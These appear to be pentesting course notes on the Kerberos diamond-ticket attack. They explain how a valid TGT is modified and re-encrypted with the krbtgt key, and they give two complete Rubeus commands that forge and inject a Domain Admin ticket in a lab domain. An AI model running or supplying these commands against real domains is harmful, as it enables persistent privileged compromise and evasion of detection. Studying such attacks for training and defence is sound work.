# Diamont Ticket  

Tags: #AD #Windows #Powershell #Rubeus 


```bash  
- A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account.
- Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack.
- Once again, the persistence lifetime depends on krbtgt account.
- A diamond ticket is more opsec safe as it has:
- Valid ticket times because a TGT issued by the DC is modified
- In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.
```

## Rubeus 

```powershell 
# We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):
❯ Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```powershell 
# We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
❯ Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

[![Diamont-Ticket.png](https://i.postimg.cc/25jnT74h/Diamont-Ticket.png)](https://postimg.cc/WdKD1rY1)